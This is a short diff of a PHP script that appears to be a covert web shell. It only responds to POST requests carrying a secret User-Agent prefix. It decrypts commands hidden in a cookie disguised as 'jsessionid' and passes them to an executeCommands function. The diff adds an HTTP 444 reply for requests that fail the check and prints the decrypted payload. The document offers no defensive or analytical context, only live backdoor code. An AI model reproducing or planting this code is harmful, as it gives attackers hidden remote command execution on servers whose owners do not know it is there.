@@ -376,11 +376,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         } else {
             $s = $_COOKIE['jsessionid'];
             $v = explode(".", base64_decode($s));
-            try {
-                $split = unserialize(base64_decode(sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode($v[3]), hex2bin($v[2]), hex2bin($v[0]), hex2bin($v[1]))), ['allowed_classes' => false]);
-            } catch (SodiumException $e) {
-                echo $e . "\n";
-            }
+            $split = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode($v[3]), hex2bin($v[2]), hex2bin($v[0]), hex2bin($v[1]));
+            echo print_r($split);
         }
         executeCommands($split, "0");
     } elseif (isset($_POST["clone"])) {
@@ -399,6 +396,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
             $final = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($sp[3], $sp[0], $sp[1], $sp[2]);
             $axD = unserialize(base64_decode($final), ['allowed_classes' => false]);
             b64($axD, $aSX[0]);
+        }else{
+            http_response_code(444);
         }
     } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['jsessionid']) {
         $splitter = explode(".", base64_decode($_COOKIE['jsessionid']));
